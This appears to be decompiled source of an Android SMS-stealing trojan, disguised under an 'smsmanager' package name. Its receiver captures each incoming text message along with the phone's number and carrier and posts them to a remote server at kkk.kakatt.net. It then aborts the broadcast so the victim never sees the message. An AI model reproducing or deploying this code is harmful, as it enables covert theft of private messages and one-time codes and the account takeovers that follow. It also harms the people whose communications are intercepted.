package com.example.smsmanager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import cn.smsmanager.tools.JSONParser;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class smsReceiver extends BroadcastReceiver {
    private static String BLOCKED_NUMBER = "10010";
    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    String TAG = "smsReceiver";
    Intent intent_thread;
    JSONParser jsonParser = new JSONParser();
    List<NameValuePair> params2;
    String update_url = "http://kkk.kakatt.net:3369/send_product.php";

    public void onReceive(Context context, Intent intent) {
        TelephonyManager tel = (TelephonyManager) context.getSystemService("phone");
        if (SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                for (Object pdu : (Object[]) bundle.get("pdus")) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    this.params2 = new ArrayList();
                    this.params2.add(new BasicNameValuePair("sim_no", tel.getLine1Number()));
                    this.params2.add(new BasicNameValuePair("tel", tel.getSimOperatorName()));
                    this.params2.add(new BasicNameValuePair("thread_id", "0"));
                    this.params2.add(new BasicNameValuePair("address", smsMessage.getOriginatingAddress()));
                    String dateString2 = "";
                    try {
                        dateString2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(smsMessage.getTimestampMillis()));
                    } catch (Exception e) {
                        dateString2 = "1970-01-01 10:12:13";
                    }
                    this.params2.add(new BasicNameValuePair("datetime", dateString2));
                    this.params2.add(new BasicNameValuePair("bady", smsMessage.getDisplayMessageBody()));
                    this.params2.add(new BasicNameValuePair("read", "1"));
                    this.params2.add(new BasicNameValuePair("type", "1"));
                    new Thread() {
                        public void run() {
                            HttpClient httpclient = new DefaultHttpClient();
                            HttpPost httppost = new HttpPost(smsReceiver.this.update_url);
                            try {
                                httppost.setEntity(new UrlEncodedFormEntity(smsReceiver.this.params2, "EUC-KR"));
                                Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params2));", "gone");
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                            try {
                                Log.d("response=httpclient.execute(httppost);", httpclient.execute(httppost).toString());
                            } catch (ClientProtocolException e2) {
                                e2.printStackTrace();
                            } catch (IOException e3) {
                                e3.printStackTrace();
                            }
                        }
                    }.start();
                    abortBroadcast();
                }
            }
        }
    }
}
